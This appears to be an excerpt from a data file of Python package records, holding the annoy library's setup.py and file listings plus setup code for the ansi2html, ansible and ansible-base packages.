    extra_compile_args += ['-DANNOYLIB_MULTITHREADED_BUILD']

    if os.name != 'nt':
        extra_compile_args += ['-std=c++14']

# #349: something with OS X Mojave causes libstd not to be found
if platform.system() == 'Darwin':
    extra_compile_args += ['-mmacosx-version-min=10.12']
    extra_link_args += ['-stdlib=libc++', '-mmacosx-version-min=10.12']

# Manual configuration, you're on your own here.
manual_compiler_args = os.environ.get('ANNOY_COMPILER_ARGS', None)
if manual_compiler_args:
    extra_compile_args = manual_compiler_args.split(',')
manual_linker_args = os.environ.get('ANNOY_LINKER_ARGS', None)
if manual_linker_args:
    extra_link_args = manual_linker_args.split(',')

setup(name='annoy',
      version='1.17.1',
      description='Approximate Nearest Neighbors in C++/Python optimized for memory usage and loading/saving to disk.',
      packages=['annoy'],
      package_data={'annoy': ['__init__.pyi', 'py.typed']},
      ext_modules=[
          Extension(
              'annoy.annoylib', ['src/annoymodule.cc'],
              depends=['src/annoylib.h', 'src/kissrandom.h', 'src/mman.h'],
              extra_compile_args=extra_compile_args,
              extra_link_args=extra_link_args,
          )
      ],
      long_description=long_description,
      author='Erik Bernhardsson',
      author_email='mail@erikbern.com',
      url='https://github.com/spotify/annoy',
      license='Apache License 2.0',
      classifiers=[
          'Development Status :: 5 - Production/Stable',
          'Programming Language :: Python',
          'Programming Language :: Python :: 2.6',
          'Programming Language :: Python :: 2.7',
          'Programming Language :: Python :: 3.3',
          'Programming Language :: Python :: 3.4',
          'Programming Language :: Python :: 3.5',
          'Programming Language :: Python :: 3.6',
          'Programming Language :: Python :: 3.7',
          'Programming Language :: Python :: 3.8',
          'Programming Language :: Python :: 3.9',
      ],
      keywords='nns, approximate nearest neighbor search',
      setup_requires=['nose>=1.0'],
      tests_require=['numpy', 'h5py']
      )
",0
ansi2html-1.8.0,0,1,1,1,1,0,0,0,.coveragerc CODEOWNERS release-drafter.yml labels.yml release-drafter.yml release.yml tox.yml .gitignore .pre-commit-config.yaml .pylintrc converter.py py.typed style.py util.py __init__.py __main__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGELOG.rst codecov.yml make.bat Makefile api.rst changelog.rst conf.py index.rst LICENSE .gitignore ansi2html.1 ansi2html.1.txt asciidoc.conf MANIFEST.in mypy.ini PKG-INFO pyproject.toml README.rst readthedocs.yml setup.cfg ansicolor.html ansicolor.txt ansicolor_eix.html ansicolor_eix.txt produce_headers.txt test_ansi2html.py tox.ini,,1
ansible-6.2.0,0,1,1,1,0,0,1,0,dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt BOTMETA.yml bug_report.yml ci_report.yml config.yml documentation_report.yml feature_request.yml patchback.yml settings.yml .gitignore bindep.txt CHANGELOG.rst changelog.yaml config.yaml .keep CONTRIBUTING.md COPYING amazon.aws.aws_account_attribute_lookup.rst amazon.aws.aws_az_info_module.rst amazon.aws.aws_caller_info_module.rst amazon.aws.aws_ec2_inventory.rst amazon.aws.aws_rds_inventory.rst amazon.aws.aws_s3_module.rst amazon.aws.aws_secret_lookup.rst amazon.aws.aws_service_ip_ranges_lookup.rst amazon.aws.aws_ssm_lookup.rst amazon.aws.cloudformation_info_module.rst amazon.aws.cloudformation_module.rst amazon.aws.ec2_ami_info_module.rst amazon.aws.ec2_ami_module.rst amazon.aws.ec2_eni_info_module.rst amazon.aws.ec2_eni_module.rst amazon.aws.ec2_group_info_module.rst amazon.aws.ec2_group_module.rst amazon.aws.ec2_instance_info_module.rst amazon.aws.ec2_instance_module.rst amazon.aws.ec2_key_module.rst amazon.aws.ec2_metadata_facts_module.rst amazon.aws.ec2_module.rst amazon.aws.ec2_snapshot_info_module.rst amazon.aws.ec2_snapshot_module.rst amazon.aws.ec2_spot_instance_info_module.rst amazon.aws.ec2_spot_instance_module.rst amazon.aws.ec2_tag_info_module.rst amazon.aws.ec2_tag_module.rst amazon.aws.ec2_vol_info_module.rst amazon.aws.ec2_vol_module.rst amazon.aws.ec2_vpc_dhcp_option_info_module.rst amazon.aws.ec2_vpc_dhcp_option_module.rst amazon.aws.ec2_vpc_endpoint_info_module.rst amazon.aws.ec2_vpc_endpoint_module.rst amazon.aws.ec2_vpc_endpoint_service_info_module.rs amazon.aws.ec2_vpc_igw_info_module.rst amazon.aws.ec2_vpc_igw_module.rst amazon.aws.ec2_vpc_nat_gateway_info_module.rst amazon.aws.ec2_vpc_nat_gateway_module.rst amazon.aws.ec2_vpc_net_info_module.rst amazon.aws.ec2_vpc_net_module.rst amazon.aws.ec2_vpc_route_table_info_module.rst amazon.aws.ec2_vpc_route_table_module.rst amazon.aws.ec2_vpc_subnet_info_module.rst amazon.aws.ec2_vpc_subnet_module.rst amazon.aws.elb_classic_lb_module.rst amazon.aws.s3_bucket_module.rst extra-docs.yml dev_guidelines.rst guide_aws.rst FILES.json MANIFEST.json runtime.yml aws_s3.py __init__.py aws_resource_actions.py __init__.py aws.py aws_boto3.py aws_credentials.py aws_region.py ec2.py tags.py __init__.py aws_ec2.py aws_rds.py __init__.py aws_account_attribute.py aws_secret.py aws_service_ip_ranges.py aws_ssm.py __init__.py aws_az_facts.py aws_az_info.py aws_caller_info.py aws_s3.py cloudformation.py cloudformation_info.py ec2.py ec2_ami.py ec2_ami_info.py ec2_eni.py ec2_eni_info.py ec2_group.py ec2_group_info.py ec2_instance.py ec2_instance_info.py ec2_key.py ec2_metadata_facts.py ec2_snapshot.py ec2_snapshot_info.py ec2_spot_instance.py ec2_spot_instance_info.py ec2_tag.py ec2_tag_info.py ec2_vol.py ec2_vol_info.py ec2_vpc_dhcp_option.py ec2_vpc_dhcp_option_info.py ec2_vpc_endpoint.py ec2_vpc_endpoint_info.py ec2_vpc_endpoint_service_info.py ec2_vpc_igw.py ec2_vpc_igw_info.py ec2_vpc_nat_gateway.py ec2_vpc_nat_gateway_info.py ec2_vpc_net.py ec2_vpc_net_info.py ec2_vpc_route_table.py ec2_vpc_route_table_info.py ec2_vpc_subnet.py ec2_vpc_subnet_info.py elb_classic_lb.py s3_bucket.py __init__.py acm.py batch.py cloud.py cloudfront_facts.py core.py direct_connect.py ec2.py elbv2.py elb_utils.py iam.py policy.py rds.py s3.py tagging.py urls.py version.py waf.py waiters.py _version.py __init__.py __init__.py PSF-license.txt README.md requirements.txt test-requirements.txt .gitignore config.yml constraints.txt requirements.txt aliases main.yml main.yml main.yml aliases main.ya aliases main.yml hello.txt test.png main.yml copy_object.yml delete_bucket.ym main.yml policy.json. put-template aliases main. cf_templ update_p main.yml main.yml aliases main.yml main.yml main.yml aliases main.yml main.yml main.yml main.yml aliases main.yml main.yml main.yaml test_attachment test_deletion.y test_eni_basic_ test_ipaddress_ test_modifying_ aliases main.yml main.yml data_validati diff_mode.yml ec2_classic.y egress_tests. group_info.ym ipv6_default_ main.yml multi_account multi_nested_ numeric_proto rule_group_cr aliases inventory main.yml main.yml runme.sh aliases main.yml main.yml main.yml aliases main. CHANGELOG-v6.rst COPYING MANIFEST.in PKG-INFO README.rst,"# Copyright Red Hat, Inc. All Rights Reserved.
# GNU General Public License v3.0+ (see COPYING or https://www.gnu.org/licenses/gpl-3.0.txt)

import setuptools

setuptools.setup(
    setup_requires=['pbr'],
    pbr=True)
",1
ansible-base-2.10.17,1,1,1,1,0,0,1,0,ansible ansible-config ansible-connection ansible-console ansible-doc ansible-galaxy ansible-inventory ansible-playbook ansible-pull ansible-vault CHANGELOG-v2.10.rst CHANGELOG.rst changelog.yaml COPYING find-plugin-refs.py testing_formatter.sh .gitignore .nojekyll ansible_2_10.inv ansible_2_5.inv ansible_2_6.inv ansible_2_7.inv ansible_2_8.inv ansible_2_9.inv ansible_3.inv collection-plugins.yml jinja2.inv application.js keyword_desc.yml Makefile Makefile.sphinx modules.js python2.inv python3.inv README.md requirements.txt 2.10_index.rst 404.rst ansible_index.rst index.rst all_plugins.rst code_of_conduct.rst committer_guidelines.rst communication.rst community.rst contributing_maintained_collections.rst contributor_license_agreement.rst development_process.rst documentation_contributions.rst github_admins.rst how_can_I_help.rst index.rst maintainers.rst other_tools_and_programs.rst release_managers.rst reporting_bugs_and_features.rst triage_process.rst core_index.rst debugging.rst developing_api.rst developing_collections.rst developing_core.rst developing_inventory.rst developing_locally.rst developing_modules.rst developing_modules_best_practices.rst developing_modules_checklist.rst developing_modules_documenting.rst developing_modules_general.rst developing_modules_general_aci.rst developing_modules_general_windows.rst developing_modules_in_groups.rst developing_module_utilities.rst developing_plugins.rst developing_program_flow_modules.rst developing_python_3.rst developing_rebasing.rst index.rst migrating_roles.rst module_lifecycle.rst overview_architecture.rst aws_guidelines.rst openstack_guidelines.rst ovirt_dev_guide.rst vmware_guidelines.rst licensing.txt basic_rules.rst grammar_punctuation.rst commas-matter-2.jpg commas-matter.jpg hyphen-funny.jpg thenvsthan.jpg index.rst resources.rst search_hints.rst spelling_word_choice.rst trademarks.rst voice_style.rst why_use.rst action-plugin-docs.rst ansible-doc.rst ansible-var-precedence-check.rst azure-requirements.rst bin-symlinks.rst boilerplate.rst botmeta.rst changelog.rst compile.rst configure-remoting-ps1.rst deprecated-config.rst docs-build.rst empty-init.rst future-import-boilerplate.rst ignores.rst import.rst integration-aliases.rst line-endings.rst metaclass-boilerplate.rst no-assert.rst no-basestring.rst no-dict-iteritems.rst no-dict-iterkeys.rst no-dict-itervalues.rst no-get-exception.rst no-illegal-filenames.rst no-main-display.rst no-smart-quotes.rst no-tests-as-filters.rst no-underscore-variable.rst no-unicode-literals.rst no-unwanted-files.rst no-wildcard-import.rst obsolete-files.rst package-data.rst pep8.rst pslint.rst pylint-ansible-test.rst pylint.rst release-names.rst replace-urlopen.rst required-and-default-attributes.rst rstcheck.rst runtime-metadata.rst sanity-docs.rst shebang.rst shellcheck.rst symlinks.rst test-constraints.rst update-bundled.rst use-argspec-type-path.rst use-compat-six.rst validate-modules.rst yamllint.rst testing.rst testing_compile.rst testing_documentation.rst testing_httptester.rst testing_integration.rst testing_integration_legacy.rst testing_pep8.rst testing_running_locally.rst testing_sanity.rst testing_units.rst testing_units_modules.rst testing_validate-modules.rst dev_guide.rst user_guide.rst cow.png index.rst intro_configuration.rst intro_installation.rst implicit_localhost.rst developing_plugins_network.rst developing_resource_modules_network.rst documenting_modules_network.rst index.rst basic_concepts.rst first_inventory.rst first_playbook.rst index.rst intermediate_concepts.rst network_connection_options.rst network_differences.rst network_resources.rst network_roles.rst first_playbook.yml first_playbook_ext.yml index.rst cli_parsing.rst faq.rst index.rst network_best_practices_2.5.rst network_debug_troubleshooting.rst network_resource_modules.rst network_working_with_command_output.rst platform_ce.rst platform_cnos.rst platform_dellos10.rst platform_dellos6.rst platform_dellos9.rst platform_enos.rst platform_eos.rst platform_eric_eccli.rst platform_exos.rst platform_frr.rst platform_icx.rst platform_index.rst platform_ios.rst platform_iosxr.rst platform_ironware.rst platform_junos.rst platform_meraki.rst platform_netconf_enabled.rst platform_netvisor.rst platform_nos.rst platform_nxos.rst platform_routeros.rst platform_slxos.rst platform_voss.rst platform_vyos.rst SSH_warning.txt action.rst become.rst cache.rst callback.rst cliconf.rst connection.rst httpapi.rst index.html inventory.rst lookup.rst netconf.rst plugins.rst shell.rst strategy.rst vars.rst core_porting_guides.rst porting_guides.rst porting_guide_2.0.rst porting_guide_2.10.rst porting_guide_2.3.rst porting_guide_2.4.rst porting_guide_2.5.rst porting_guide_2.6.rst porting_guide_2.7.rst porting_guide_2.8.rst porting_guide_2.9.rst porting_guide_base_2.10.rst .rstcheck.cfg automationhub.rst common_return_values.rst faq.rst general_precedence.rst glossary.rst interpreter_discovery.rst logging.rst module_utils.rst python_3_support.rst release_and_maintenance.rst special_variables.rst test_strategies.rst tower.rst YAMLSyntax.rst ansible_base_roadmap_index.rst ansible_roadmap_index.rst COLLECTIONS_2_10.rst COLLECTIONS_3_0.rst index.rst old_roadmap_index.rst ROADMAP_2_10.rst ROADMAP_2_5.rst ROADMAP_2_6.rst ROADMAP_2_7.rst ROADMAP_2_8.rst ROADMAP_2_9.rst cloud_guides.rst guides.rst guide_aci.rst guide_alicloud.rst guide_aws.rst guide_azure.rst guide_cloudstack.rst guide_docker.rst guide_gce.rst guide_infoblox.rst guide_kubernetes.rst guide_meraki.rst guide_online.rst guide_oracle.rst guide_packet.rst guide_rax.rst guide_scaleway.rst guide_vagrant.rst guide_vmware.rst guide_vultr.rst network_guides.rst scenario_template.rst virt_guides.rst faq.rst scenario_clone_template.rst scenario_find_vm_folder.rst scenario_remove_vm.rst scenario_rename_vm.rst scenario_vmware_http.rst vmware_concepts.rst vmware_external_doc_links.rst vmware_getting_started.rst vmware_intro.rst vmware_inventory.rst vmware_inventory_filters.rst vmware_inventory_hostnames.rs vmware_inventory_vm_attribute vmware_module_reference.rst vmware_requirements.rst vmware_scenarios.rst vmware_troubleshooting.rst basic_concepts.txt download_tarball_collections.txt galaxy_server_list.txt installing_collections.txt installing_collections_git_repo.txt installing_multiple_collections.txt installing_older_collection.txt basic_concepts.rst become.rst collections_using.rst command_line_tools.rst complex_data_manipulation.rst connection_details.rst guide_rolling_upgrade.rst index.rst intro.rst intro_adhoc.rst intro_bsd.rst intro_dynamic_inventory.rst intro_getting_started.rst intro_inventory.rst intro_patterns.rst intro_windows.rst modules.rst modules_intro.rst modules_support.rst playbooks.rst playbooks_advanced_syntax.rst playbooks_async.rst playbooks_best_practices.rst playbooks_blocks.rst playbooks_checkmode.rst playbooks_conditionals.rst playbooks_debugger.rst playbooks_delegation.rst playbooks_environment.rst playbooks_error_handling.rst playbooks_filters.rst playbooks_filters_ipaddr.rst playbooks_handlers.rst playbooks_intro.rst playbooks_lookups.rst playbooks_loops.rst playbooks_module_defaults.rst playbooks_prompts.rst playbooks_python_version.rst playbooks_reuse.rst playbooks_reuse_includes.rst playbooks_reuse_roles.rst playbooks_roles.rst playbooks_special_topics.rst playbooks_startnstep.rst playbooks_strategies.rst playbooks_tags.rst playbooks_templating.rst playbooks_tests.rst playbooks_variables.rst playbooks_vars_facts.rst playbooks_vault.rst playbook_pathing.rst plugin_filtering_config.rst quickstart.rst sample_setup.rst SSH_password_prompt.txt with2loop.txt vault.rst windows.rst windows_dsc.rst windows_faq.rst windows_performance.rst windows_setup.rst windows_usage.rst windows_winrm.rst 2.10_conf.py ansible_conf.py core_conf.py variables.dot pygments_lexer.py ansible.css core.css pygments.css ansible_banner.html ansible_eol_banner.html ansible_extrabody.html ansible_extrafooter.html ansible_extrahead.html ansible_extranav.html ansible_searchbox.html ansible_versions.html breadcrumbs.html footer.html layout.html search.html searchbox.html badge_only.css theme.css fontawesome-webfont.eot fontawesome-webfont.svg fontawesome-webfont.ttf fontawesome-webfont.woff fontawesome-webfont.woff2 FontAwesome.otf logo_invert.png modernizr.min.js theme.js theme.conf versions.html __init__.py .gitignore ansible-config.1 ansible-console.1 ansible-doc.1 ansible-galaxy.1 ansible-inventory.1 ansible-playbook.1 ansible-pull.1 ansible-vault.1 ansible.1 .gitdir cli_rst.j2 collections_galaxy_meta.rst.j2 config.rst.j2 man.j2 modules_by_category.rst.j2 playbooks_keywords.rst.j2 ansible.cfg hosts ConfigureRemotingForAnsible.ps1 upgrade_to_ps3.ps1 build-ansible.py announce.py change_detection.py commands.py collection_meta.py docs_build.py dump_config.py dump_keywords.py file_deprecated_issues.py generate_man.py porting_guide.py release_announcement.py update_intersphinx.py errors.py __init__.py __init__.py adhoc.py option_helpers.py __init__.py config.py console.py doc.py galaxy.py inventory.py playbook.py pull.py ansible_cli_stub.py ansible_connection_cli_stub.py __init__.py vault.py __init__.py list.py __init__.py __init__.py __init__.py ansible_builtin_runtime.yml base.yml data.py manager.py __init__.py constants.py context.py yaml_strings.py __init__.py action_write_locks.py python_target.py __init__.py interpreter_discovery.py module_common.py playbook_executor.py play_iterator.py async_watchdog.ps1 async_wrapper.ps1 become_wrapper.ps1 bootstrap_wrapper.ps1 coverage_wrapper.ps1 exec_wrapper.ps1 module_manifest.py module_powershell_wrapper.ps1 module_script_wrapper.ps1 module_wrapper.ps1 __init__.py worker.py __init__.py stats.py task_executor.py task_queue_manager.py task_result.py __init__.py api.py collection.py .travis.yml apb.yml.j2 main.yml.j2 Dockerfile.j2 .git_keep main.yml.j2 Makefile.j2 main.yml.j2 deprovision.yml.j2 provision.yml.j2 README.md main.yml.j2 .git_keep ansible.cfg inventory test.yml.j2 main.yml.j2 collections_galaxy_meta.yml .travis.yml main.yml.j2 .git_keep main.yml.j2 container.yml.j2 main.yml.j2 README.md main.yml.j2 .git_keep ansible.cfg inventory test.yml.j2 main.yml.j2 .git_keep galaxy.yml.j2 README.md.j2 README.md.j2 .git_keep .travis.yml main.yml.j2 .git_keep main.yml.j2 main.yml.j2 README.md main.yml.j2 .git_keep inventory test.yml.j2 main.yml.j2 .travis.yml example.py.j2 main.yml.j2 .git_keep example_command.py.j2 example_config.py.j2 example_facts.py.j2 main.yml.j2 example.py.j2 example.py.j2 README.md main.yml.j2 .git_keep example.py.j2 inventory test.yml.j2 main.yml.j2 role.py token.py user_agent.py __init__.py data.py group.py helpers.py host.py manager.py __init__.py add_host.py apt.py apt_key.py apt_repository.py assemble.py assert.py async_status.py async_wrapper.py blockinfile.py command.py copy.py cron.py debconf.py debug.py dnf.py dpkg_selections.py expect.py fail.py fetch.py file.py find.py gather_facts.py getent.py get_url.py git.py group.py group_by.py hostname.py import_playbook.py import_role.py import_tasks.py include.py include_role.py include_tasks.py include_vars.py iptables.py known_hosts.py lineinfile.py meta.py package.py package_facts.py pause.py ping.py pip.py raw.py reboot.py replace.py rpm_key.py script.py service.py service_facts.py setup.py set_fact.py set_stats.py shell.py slurp.py stat.py subversion.py systemd.py sysvinit.py tempfile.py template.py unarchive.py uri.py user.py wait_for.py wait_for_connection.py yum.py yum_repository.py __init__.py ansible_release.py api.py basic.py collections.py dict_transformations.py file.py json.py network.py parameters.py process.py removed.py sys_info.py converters.py formatters.py __init__.py validation.py warnings.py _collections_compat.py _json_compat.py _utils.py __init__.py importlib.py paramiko.py selectors.py _selectors2.py __init__.py connection.py Ansible.AccessToken.cs Ansible.Basic.cs Ansible.Become.cs Ansible.Privilege.cs Ansible.Process.cs __init__.py _distro.py __init__.py ansible_collector.py collector.py compat.py default_collectors.py aix.py base.py darwin.py dragonfly.py freebsd.py hpux.py hurd.py linux.py netbsd.py openbsd.py sunos.py __init__.py namespace.py aix.py base.py darwin.py dragonfly.py fc_wwn.py freebsd.py generic_bsd.py hpux.py hurd.py iscsi.py linux.py netbsd.py nvme.py openbsd.py sunos.py __init__.py facter.py ohai.py __init__.py packages.py sysctl.py apparmor.py caps.py chroot.py cmdline.py date_time.py distribution.py dns.py env.py fips.py local.py lsb.py pkg_mgr.py platform.py python.py selinux.py service_mgr.py ssh_pub_keys.py user.py __init__.py timeout.py utils.py base.py dragonfly.py freebsd.py hpux.py linux.py netbsd.py openbsd.py sunos.py sysctl.py __init__.py __init__.py json_utils.py convert_bool.py __init__.py Ansible.ModuleUtils.AddType.psm1 Ansible.ModuleUtils.ArgvParser.psm1 Ansible.ModuleUtils.Backup.psm1 Ansible.ModuleUtils.CamelConversion.psm1 Ansible.ModuleUtils.CommandUtil.psm1 Ansible.ModuleUtils.FileUtil.psm1 Ansible.ModuleUtils.Legacy.psm1 Ansible.ModuleUtils.LinkUtil.psm1 Ansible.ModuleUtils.PrivilegeUtil.psm1 Ansible.ModuleUtils.SID.psm1 Ansible.ModuleUtils.WebRequest.psm1 __init__.py pycompat24.py service.py __init__.py splitter.py urls.py yumdnf.py _text.py __init__.py ajson.py dataloader.py mod_args.py plugin_docs.py quoting.py splitter.py addresses.py jsonify.py yaml.py __init__.py __init__.py constructor.py dumper.py loader.py objects.py __init__.py __init__.py attribute.py base.py block.py collectionsearch.py conditional.py handler.py handler_task_include.py helpers.py included_file.py loop_control.py play.py playbook_include.py play_context.py definition.py include.py metadata.py requirement.py __init__.py role_include.py taggable.py task.py task_include.py __init__.py add_host.py assemble.py assert.py async_status.py command.py copy.py debug.py fail.py fetch.py gather_facts.py group_by.py include_vars.py normal.py package.py pause.py raw.py reboot.py script.py service.py set_fact.py set_stats.py shell.py template.py unarchive.py uri.py wait_for_connection.py yum.py __init__.py runas.py su.py sudo.py __init__.py base.py jsonfile.py memory.py __init__.py default.py junit.py minimal.py oneline.py tree.py __init__.py __init__.py local.py paramiko_ssh.py psrp.py ssh.py winrm.py __init__.py action_common_attributes.py backup.py connection_pipelining.py constructed.py decrypt.py default_callback.py files.py inventory_cache.py return_common.py shell_common.py shell_windows.py template_common.py url.py url_windows.py validate.py vars_plugin_staging.py __init__.py core.py mathstuff.py urls.py urlsplit.py __init__.py __init__.py advanced_host_list.py auto.py constructed.py generator.py host_list.py ini.py script.py toml.py yaml.py __init__.py loader.py config.py csvfile.py dict.py env.py file.py fileglob.py first_found.py indexed_items.py ini.py inventory_hostnames.py items.py lines.py list.py nested.py password.py pipe.py random_choice.py sequence.py subelements.py template.py together.py unvault.py url.py varnames.py vars.py __init__.py __init__.py cmd.py powershell.py sh.py __init__.py debug.py free.py host_pinned.py linear.py __init__.py __init__.py core.py files.py mathstuff.py __init__.py host_group_vars.py __init__.py __init__.py release.py native_helpers.py safe_eval.py template.py vars.py __init__.py cmd_functions.py _collection_config.py _collection_finder.py _collection_meta.py __init__.py color.py context_objects.py display.py encrypt.py fqcn.py galaxy.py hashing.py helpers.py jsonrpc.py listify.py multiprocessing.py path.py plugin_docs.py py3compat.py sentinel.py shlex.py singleton.py ssh_functions.py unicode.py unsafe_proxy.py vars.py version.py __init__.py clean.py fact_cache.py hostvars.py manager.py plugins.py reserved.py __init__.py __init__.py __init__.py Apache-License.txt MIT-license.txt PSF-license.txt simplified_bsd.txt Makefile MANIFEST.in README.md ansible-base.dirs ansible-base.install ansible-test.install changelog compat control copyright Dockerfile docs pycompat README.md rules README.md .gitignore README.md Portfile Makefile version_helper_test.py __init__.py version_helper.py __init__.py check-link-behavior.py PKG-INFO README.rst requirements.txt setup.py SYMLINK_CACHE.json Makefile test_diff.py test_validate_modules_regex.py network-integration.cfg network-integration.requirements.txt aliases main.yml aliases check_rlimit_and_maxfd.py custom_module.py sys_check.py custom_util.py main.yml adhoc-callback.stdout aliases ansible-test_.cfg callback_debug.py no-extension playbook.yml playbookdir_cfg.ini runme.sh vars.yml aliases fakemodule.output inventory test_docs.py test_docs_missing_description.py test_docs_non_iterable_status.py test_docs_no_metadata.py test_docs_no_status.py test_docs_removed_precedence.py test_docs_removed_status.py test_docs_returns.py test_docs_returns_broken.py test_docs_suboptions.py test_empty.py test_no_docs.py test_no_docs_non_iterable_status.p test_no_docs_no_metadata.py test_no_docs_no_status.py runme.sh test.yml test_docs_returns.output test_docs_suboptions.output aliases cleanup-default.yml cleanup-freebsd.yml cleanup.yml runme.sh setup.yml aliases build_bad_tar.py setup_collections.py main.yml build.yml download.yml init.yml install.yml main.yml publish.yml ansible.cfg.j2 main.yml aliases main.yml download.yml empty_installed_co individual_collect main.yml multi_collection_r reinstalling.yml scm_dependency.yml scm_dependency_ded setup.yml setup_multi_collec setup_recursive_sc aliases adhoc_example1.py constraints.txt playbook_example1.py parse.py inventory runme.sh adhoc_example1.yml main.yml playbook_example1.yml setup.yml test.yml aliases galaxy.yml runtime.y README.rst i constraints.sh coverage.sh git-at-collection-base.s git-at-collection-root.s git-common.bash install-git.yml venv.sh runme.sh aliases galaxy. docker.sh runme.sh 18602.yml aliases always_block.yml inventory on_includes.yml play_level.yml runme.sh test_fatal.yml aliases main.yml main.yml apt-builddep.yml apt-multiarch.yml apt.yml main.yml repo.yml upgrade.yml url-with-deps.yml default.yml Ubuntu-20.yml aliases main.yml apt_key.yml main.yml aliases main.yml apt.yml cleanup.yml main.yml mode.yaml mode_cleanup.yaml aliases runme.sh aliases argspec.py main.yml password_no_log.yml aliases fragment1 fragment2 fragment3 fragment4 fragment5 main.yml main.yml aliases assert_quiet.out.quiet.stderr assert_quiet.out.quiet.stdout inventory quiet.yml runme.sh aliases async_test.py main.yml main.yml aliases junkping.py runme.sh test_async.yml normal.py aliases async_test.py main.yml main.yml aliases baz.txt default.yml main.yml su.yml sudo.yml bar.j2 default.yml aliases runme.sh aliases b64_latin1 b64_utf8 from_playbook main.yml main.yml b64_latin1_template.j2 b64_utf8_template.j2 from_playbook_template.j2 main.yml aliases download_binary_modules.yml all .gitignore helloworld.go Makefile main.ym test.sh test_binary_modules.yml aliases runme.sh aliases runme.sh aliases sshd_config main.yml add_block_to_existing_file.yml block_without_trailing_newline.yml create_file.yml diff.yml file_without_trailing_newline.yml insertafter.yml insertbefore.yml main.yml preserve_line_endings.yml validate.yml aliases always_failure_no_rescue_rc.yml always_failure_with_rescue_rc.yml always_no_rescue_rc.yml block_fail.yml block_fail_tasks.yml block_in_rescue.yml block_rescue_vars.yml fail.yml finalized_task.yml issue29047.yml issue29047_tasks.yml issue71306.yml main.yml nested_fail.yml nested_nested_fail.yml main.yml runme.sh unsafe_failed_task.yml aliases runme.sh test-vars_prompt.py unsafe.yml unsupported.yml vars_prompt-1.yml vars_prompt-2.yml vars_prompt-3.yml vars_prompt-4.yml vars_prompt-5.yml vars_prompt-6.yml vars_prompt-7.yml aliases callback_default.out.check_markers_dr callback_default.out.check_markers_we callback_default.out.check_nomarkers_ callback_default.out.default.stderr callback_default.out.default.stdout callback_default.out.failed_to_stderr callback_default.out.free.stdout callback_default.out.hide_ok.stderr callback_default.out.hide_ok.stdout callback_default.out.hide_skipped.std callback_default.out.hide_skipped_ok. callback_default.out.host_pinned.stdo include_me.yml inventory runme.sh test.yml test_2.yml test_dryrun.yml test_non_lockstep.yml aliases main.yml main.yml aliases check_mode-not-on-cli.yml check_mode-on-cli.yml check_mode.yml main.yml main.yml foo.txt main.yml foo.j2 main.yml runme.sh aliases runme.sh setup.yml test-cli.py test_k_and_K.py a.statichost.yml aliases cache.statichost.yml check_populated_inventory.yml con v1_vars_plugin.py v2_vars_plugin.py vars_req_whitelist.py override_formerly_core_mask includeme.yml inventory_test.yml invocation_tests.yml ping.py noop.yml posix.yml redirected.statichost.yml main.yml main.yml runme.sh MANIFEST.json testmodule2.py test_bypass_host_loop.yml test_collection_meta.yml override_formerly_core_masked test_redirect_list.yml vars_plugin_tests.sh windows.yml aliases runme.sh test.yml aliases runme.sh test.yml windows.yml aliases runme.sh aliases create_afile.sh remove_afile.sh test.sh main.yml main.yml aliases main.yml is_mac.py aliases play.yml runme.sh test_no_warnings.yml test_warnings.yml main.yml aliases inline_comment_ansible.cfg runme.sh aliases test.sh test_connection.yml test_reset_connection.yml delegation_action aliases delegation_co inventory.ini runme.sh test.yml aliases runme.sh test_connection.inventory aliases runme.sh test.sh test_connection.inventory aliases test.sh aliases empty.txt runme.sh tests.yml test_connection.inventory.j2 aliases posix.sh runme.sh test_connection.inventory aliases runme.sh tests.yml tests_fetch.yml test_connection.inventory.j2 windows.sh aliases runme.sh test_connection.inventory.j2 aliases main.yml foo.txt bar.txt bar.txt baz.txt qux.txt main.yml acls.yml check_mode.yml dest_in_non_existent_directories.yml dest_in_non_existent_directories_remote_src main.yml no_log.yml selinux.yml src_file_dest_file_in_non_existent_dir.yml src_file_dest_file_in_non_existent_dir_remo tests.yml aliases main.yml main.yml main.yml alpine.yml default.yml aliases attempt_to_load_invalid_json.yml runme.sh invalid.json aliases main.yml main.yml aliases main.yml main_fqcn.yml nosetfacts.yml runme.sh aliases fakelocal.py delegate_and_nolog.yml delegate_facts_block.yml delegate_local_from_root.yml delegate_vars_hanldling.yml discovery_applied.yml testfile has_hostvars.yml inventory inventory_interpreters detect_interpreter.py foo.j2 runme.sh test_delegate_to.yml test_delegate_to_loop_caching.yml test_delegate_to_loop_randomness.yml test_loop_control.yml verify_interpreter.yml aliases convert_camelCase.py convert_snake_case.py main.yml test_convert_camelCase.yml test_convert_snake_case.yml aliases main.yml dnf.yml dnfinstallroot.yml dnfreleasever.yml filters.yml filters_check_mode.yml gpg.yml logging.yml main.yml modularity.yml repo.yml CentOS.yml Fedora.yml main.yml RedHat.yml aliases main.yaml dpkg_selections.yaml main.yaml aliases import_pkg_resources.py main.yml aliases test_integration_module main.yml aliases runme.sh test_environment.yml aliases dummy.py inventory play.yml runme.sh aliases foo.txt test_command.py main.yml aliases basdscript.fact goodscript.fact preferences.fact unreadable.fact main.yml main.yml aliases main.yml main.yml aliases main.yml aliases avoid_slurp_return.yml here.txt slurp.py main.yml main.yml runme.sh run_fetch_tests.yml aliases main.yml foo.txt fileC fileD fileA fileB main.yml diff_peek.yml directory_as_dest.yml initialize.yml main.yml selinux_tests.yml state_link.yml unicode_path.yml aliases 9851.txt one.txt two.txt foo.txt handle_undefined_type_errors.yml localhost main.yml runme.sh runme.yml main.yml foo.j2 py26json.j2 main.yml aliases main.yml aliases runme.sh runme.yml main.yml aliases main.yml aliases main.yml main.yml aliases explicit.yml implicit.yml runme.sh smart.yml uuid.fact aliases none.py inventory bogus_facts facts_one facts_two file_utils.py one_two.json prevent_clobbering.yml runme.sh test_gathering_facts.yml test_module_defaults.yml test_prevent_injection.yml test_run_once.yml two_one.json uuid.fact verify_merge_facts.yml verify_subset.yml aliases main.yml main.yml aliases testserver.py main.yml main.yml aliases cleanup-default.yml cleanup-freebsd.yml main.yml main.yml ambiguous-ref.yml archive.yml change-repo-url.yml checkout-new-tag.yml depth.yml forcefully-fetch-tag.yml formats.yml gpg-verification.yml localmods.yml main.yml missing_hostkey.yml no-destination.yml reset-origin.yml separate-git-dir.yml setup-local-repos.yml setup.yml specific-revision.yml submodules.yml main.yml aliases gidget.py grouplist.sh main.yml main.yml tests.yml aliases requirements.txt runme.sh test_jinja2_groupby.yml aliases create_groups.yml all camelus vicugna inventory.group_by runme.sh test_group_by.yml 